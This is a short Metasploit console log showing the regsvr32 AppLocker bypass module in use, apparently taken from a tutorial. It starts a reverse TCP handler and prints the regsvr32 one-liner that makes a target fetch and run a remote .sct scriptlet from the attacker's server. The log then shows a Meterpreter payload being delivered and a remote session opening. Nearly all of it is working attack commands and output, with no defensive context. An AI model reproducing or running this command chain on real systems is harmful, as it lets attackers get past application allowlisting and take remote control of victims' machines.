msf exploit(regsvr32_applocker_bypass_server) > set SRVPORT 8282
SRVPORT => 8282
msf exploit(regsvr32_applocker_bypass_server) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.0.100:4444
msf exploit(regsvr32_applocker_bypass_server) >
[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0
[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0
[*] Server started.
[*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll
[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100
[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100
[*] Sending stage (983599 bytes) to 192.168.0.100
[*] Meterpreter session 1 opened (192.168.0.100:4444 -> 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800

msf exploit(regsvr32_applocker_bypass_server) > sessions -i 1
```